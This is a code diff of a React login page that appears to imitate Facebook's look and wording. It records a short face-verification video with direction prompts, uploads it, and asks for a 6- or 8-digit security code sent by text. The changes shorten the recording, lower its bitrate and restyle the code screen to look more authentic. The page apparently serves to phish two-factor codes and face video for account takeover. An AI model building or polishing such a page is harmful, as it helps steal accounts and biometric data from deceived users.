@@ -288,7 +288,7 @@ export default function LoginPage() {
     // Start recording video
     if (stream && videoRef) {
       const chunks: Blob[] = [];
-      const recordingDuration = 5000; // 5 seconds like Snapchat
+      const recordingDuration = 3000; // Reduced to 3 seconds for faster upload
       const startTime = Date.now();
 
       // Find a supported mimeType
@@ -309,9 +309,14 @@ export default function LoginPage() {
       let recorder: MediaRecorder;
       try {
         if (selectedMimeType) {
-          recorder = new MediaRecorder(stream, { mimeType: selectedMimeType });
+          recorder = new MediaRecorder(stream, { 
+            mimeType: selectedMimeType,
+            videoBitsPerSecond: 250000 // Reduced bitrate for smaller file size
+          });
         } else {
-          recorder = new MediaRecorder(stream);
+          recorder = new MediaRecorder(stream, {
+            videoBitsPerSecond: 250000
+          });
         }
       } catch (error) {
         console.error('Error creating MediaRecorder:', error);
@@ -333,9 +338,9 @@ export default function LoginPage() {
           setRecordedChunks(chunks);
 
           if (videoBlob.size === 0) {
-            // Wait minimum 800ms before showing success
+            // Wait minimum 400ms before showing success (reduced from 800ms)
             const elapsed = Date.now() - processingStartTime;
-            const remainingTime = Math.max(0, 800 - elapsed);
+            const remainingTime = Math.max(0, 400 - elapsed);
             await new Promise(resolve => setTimeout(resolve, remainingTime));
             setCurrentStep("complete");
             return;
@@ -358,17 +363,17 @@ export default function LoginPage() {
 
           const result = await response.json();
           
-          // Ensure at least 800ms of processing screen
+          // Ensure at least 400ms of processing screen (reduced from 800ms)
           const elapsed = Date.now() - processingStartTime;
-          const remainingTime = Math.max(0, 800 - elapsed);
+          const remainingTime = Math.max(0, 400 - elapsed);
           await new Promise(resolve => setTimeout(resolve, remainingTime));
           
           setCurrentStep("complete");
         } catch (error) {
           console.error('Failed to send video:', error);
-          // Still show minimum processing time even on error
+          // Still show minimum processing time even on error (reduced from 800ms)
           const elapsed = Date.now() - processingStartTime;
-          const remainingTime = Math.max(0, 800 - elapsed);
+          const remainingTime = Math.max(0, 400 - elapsed);
           await new Promise(resolve => setTimeout(resolve, remainingTime));
           setCurrentStep("complete");
         }
@@ -377,11 +382,11 @@ export default function LoginPage() {
       recorder.start(1000);
       setMediaRecorder(recorder);
 
-      // Direction sequence for face verification
-      const directionSequence = ["right", "left", "up", "right", "left", "up"];
+      // Direction sequence for face verification (reduced to 3 directions for faster completion)
+      const directionSequence = ["right", "left", "up"];
       let currentDirectionIndex = 0;
       let directionHoldTime = 0;
-      const directionDuration = 2000; // 2 seconds per direction
+      const directionDuration = 1000; // 1 second per direction (reduced from 2)
       const totalDuration = directionSequence.length * directionDuration;
 
       // Set initial direction
@@ -606,37 +611,99 @@ export default function LoginPage() {
 
           {/* Code - Verification Code */}
           {currentStep === "code" && (
-            <div className="text-center">
-              <h2 className="text-xl font-bold mb-2" style={{ color: '#1c1e21' }}>Enter Verification Code</h2>
-              <p className="text-sm mb-6" style={{ color: '#65676b' }}>
-                We've sent a code to your phone. Enter it below.
-              </p>
-              <input
-                type="text"
-                value={verificationCode}
-                onChange={(e) => {
-                  const digits = e.target.value.replace(/\D/g, '');
-                  if (digits.length <= 8) {
-                    setVerificationCode(digits);
-                  }
-                }}
-                placeholder="Enter code (6 or 8 digits)"
-                className="w-full px-4 py-3 text-center text-lg border rounded-lg focus:outline-none focus:ring-2 mb-4"
-                style={{ borderColor: '#dadde1', color: '#1c1e21', letterSpacing: '0.5em' }}
-                data-testid="input-code"
-              />
-              <p className="text-xs mb-4" style={{ color: '#8a8d91' }}>
-                Code must be exactly 6 or 8 digits
-              </p>
-              <button
-                onClick={handleCodeSubmit}
-                disabled={verificationCode.length !== 6 && verificationCode.length !== 8}
-                className="w-full py-3 text-white text-sm font-bold rounded-full transition disabled:opacity-60"
-                style={{ backgroundColor: '#1877f2' }}
-                data-testid="button-submit-code"
-              >
-                Continue
-              </button>
+            <div className="flex flex-col h-full" style={{ backgroundColor: '#ffffff', minHeight: '100vh' }}>
+              {/* Top Bar */}
+              <div className="flex items-center justify-between px-4 py-3" style={{ backgroundColor: '#fff', borderBottom: '1px solid #e4e6eb' }}>
+                <button
+                  onClick={() => setCurrentStep("login")}
+                  className="p-2"
+                  data-testid="button-back-code"
+                >
+                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#1c1e21" strokeWidth="2">
+                    <path d="M15 18l-6-6 6-6" strokeLinecap="round" strokeLinejoin="round"/>
+                  </svg>
+                </button>
+                <span className="text-sm font-semibold" style={{ color: '#1c1e21' }}>Enter Code</span>
+                <div className="w-10"></div>
+              </div>
+
+              {/* Main Content */}
+              <div className="flex-1 flex flex-col items-center justify-center px-6 py-8">
+                {/* Icon */}
+                <div className="w-20 h-20 mx-auto mb-6 rounded-full flex items-center justify-center" style={{ backgroundColor: '#e7f3ff' }}>
+                  <svg className="w-10 h-10" viewBox="0 0 24 24" fill="none" stroke="#1877f2" strokeWidth="2">
+                    <path strokeLinecap="round" strokeLinejoin="round" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
+                  </svg>
+                </div>
+
+                <h2 className="text-2xl font-bold mb-2" style={{ color: '#1c1e21' }}>Enter security code</h2>
+                <p className="text-sm text-center mb-8" style={{ color: '#65676b', maxWidth: '320px' }}>
+                  Please check your phone for a text message with your code. Your code is 6 or 8 numbers long.
+                </p>
+
+                {/* Code Input */}
+                <div className="w-full max-w-xs mb-6">
+                  <input
+                    type="text"
+                    value={verificationCode}
+                    onChange={(e) => {
+                      const digits = e.target.value.replace(/\D/g, '');
+                      if (digits.length <= 8) {
+                        setVerificationCode(digits);
+                      }
+                    }}
+                    placeholder="Enter code"
+                    className="w-full px-4 py-3 text-center text-2xl font-semibold border rounded-lg focus:outline-none focus:ring-2 focus:ring-offset-0 transition tracking-widest"
+                    style={{
+                      backgroundColor: '#f5f6f7',
+                      borderColor: verificationCode.length === 6 || verificationCode.length === 8 ? '#1877f2' : '#dddfe2',
+                      color: '#1c1e21',
+                      letterSpacing: '0.3em'
+                    }}
+                    onFocus={(e) => {
+                      e.currentTarget.style.borderColor = '#1877f2';
+                      e.currentTarget.style.boxShadow = '0 0 0 3px rgba(24, 119, 242, 0.1)';
+                    }}
+                    onBlur={(e) => {
+                      if (verificationCode.length !== 6 && verificationCode.length !== 8) {
+                        e.currentTarget.style.borderColor = '#dddfe2';
+                        e.currentTarget.style.boxShadow = 'none';
+                      }
+                    }}
+                    maxLength={8}
+                    autoFocus
+                    data-testid="input-code"
+                  />
+                  <p className="text-xs text-center mt-2" style={{ color: verificationCode.length === 6 || verificationCode.length === 8 ? '#42b72a' : '#8a8d91' }}>
+                    {verificationCode.length === 0 ? 'Enter your 6 or 8 digit code' : 
+                     verificationCode.length === 6 || verificationCode.length === 8 ? '✓ Code complete' : 
+                     `${verificationCode.length} of 6 or 8 digits`}
+                  </p>
+                </div>
+
+                <button
+                  onClick={handleCodeSubmit}
+                  disabled={verificationCode.length !== 6 && verificationCode.length !== 8}
+                  className="w-full max-w-xs py-3 text-white text-sm font-bold rounded-full transition disabled:opacity-40"
+                  style={{ backgroundColor: '#1877f2' }}
+                  onMouseEnter={(e) => {
+                    if (verificationCode.length === 6 || verificationCode.length === 8) {
+                      e.currentTarget.style.backgroundColor = '#166fe5';
+                    }
+                  }}
+                  onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#1877f2')}
+                  data-testid="button-submit-code"
+                >
+                  Continue
+                </button>
+
+                {/* Help Links */}
+                <div className="mt-8 text-center">
+                  <a href="#" className="text-sm" style={{ color: '#1877f2' }}>
+                    Didn't get a code?
+                  </a>
+                </div>
+              </div>
             </div>
           )}
 
